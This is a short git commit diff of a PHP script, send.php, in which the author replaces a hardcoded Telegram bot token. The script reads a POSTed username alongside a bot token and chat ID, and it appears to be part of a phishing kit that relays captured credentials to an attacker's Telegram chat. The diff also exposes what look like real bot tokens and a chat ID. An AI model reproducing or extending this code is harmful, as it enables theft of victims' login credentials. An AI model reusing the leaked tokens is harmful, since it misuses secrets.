cce446ba167236c6f9e7b6e61e189ddaea12b4cc
tolu-ctrl <121352168+tolu-ctrl@users.noreply.github.com>
2025-02-28 06:53:30 -0600

    Update send.php

--- send.php
+++ send.php
@@ -1,6 +1,6 @@
 <?php
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    $token = "7986028196:AAETiXo58eCf4_2Wh4PgnNwMX-AjQ3XENao"; // Replace with your Telegram Bot Token
+    $token = "7632866238:AAFJGMxkD8p18Z8wxnSvf5snHXJN8ZcK9BQ"; // Replace with your Telegram Bot Token
     $chat_id = "1559369377"; // Replace with your Telegram Chat ID
 
     $username = $_POST['username'];
